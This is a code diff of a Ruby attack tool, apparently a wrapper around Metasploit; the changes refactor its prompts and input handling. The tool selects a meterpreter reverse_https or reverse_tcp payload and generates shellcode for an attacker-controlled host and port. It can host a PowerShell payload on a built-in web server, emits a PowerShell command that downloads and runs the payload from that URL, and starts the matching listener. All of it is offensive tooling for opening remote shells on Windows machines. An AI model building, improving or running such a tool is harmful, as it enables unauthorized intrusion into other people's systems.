@@ -6,12 +6,13 @@ include MainCommands
 include MsfCommands
 include Menu
 def payload_select
-    puts "Please pick the payload you would like to use\n"
-    print "
+  puts "Please pick the payload you would like to use\n"
+  print "
     \n1) windows/meterpreter/reverse_https \
     \n2) windows/meterpreter/reverse_tcp \
-    \n99) Exit\n"
-    Readline.readline('> ', true)
+    \n"
+  choice = get_input('> ', 1)
+  choice.to_i
 end
 begin
   if Process.uid != 0
@@ -20,24 +21,31 @@ begin
   end
   server = Server.new
   msfhost_alert
-  msf_host = server.get_host
-  msf_port = server.get_port
+  msf_host = server.set_host
+  msf_port = server.set_port
   payload = payload_select
+  payload = payload_select until payload == 1 || payload == 2
   payload = available_payloads(payload)
-  hosting = Readline.readline("#{get_input('Would you like to host the powershell script?[yes/no]')} ", true)
-  if hosting == 'yes'
+  hosting = get_input('Host the powershell script?[yes/no] ', 'yes')
+  if hosting.downcase[0] == 'y'
     webhost_alert
-    webserver_host = server.get_host
-    webserver_port = server.get_port
-    shell_code = generate_shellcode(msf_host,msf_port,payload)
-    ssl = Readline.readline("#{get_input('Would you like to use ssl?[yes/no]')} ", true)
-    ssl = true if ssl == 'yes'
-    Thread.new { server.ruby_web_server(webserver_port,ssl,webserver_host,shell_code) }
-    ssl ? powershell_command("https://#{webserver_host}:#{webserver_port}") : powershell_command("http://#{webserver_host}:#{webserver_port}")
-    metasploit_setup(msf_host,msf_port,payload)
+    webserver_host = server.set_host
+    webserver_port = server.set_port
+    shell_code = generate_shellcode(msf_host, msf_port, payload)
+    ssl = get_input('Would you like to use ssl?[yes/no] ', 'yes')
+    ssl = true if ssl.downcase[0] == 'y'
+    Thread.new do
+      server.ruby_web_server(webserver_port, ssl, webserver_host, shell_code)
+    end
+    if ssl
+      powershell_command("https://#{webserver_host}:#{webserver_port}")
+    else
+      powershell_command("http://#{webserver_host}:#{webserver_port}")
+    end
+    metasploit_setup(msf_host, msf_port, payload)
   else
-    url = Readline.readline("#{get_input('Enter the url that holds the powershell script: ')} ", true)
+    url = get_input('Enter the url that holds the powershell script: ')
     powershell_command(url)
-    metasploit_setup(msf_host,msf_port,payload)
+    metasploit_setup(msf_host, msf_port, payload)
   end
 end
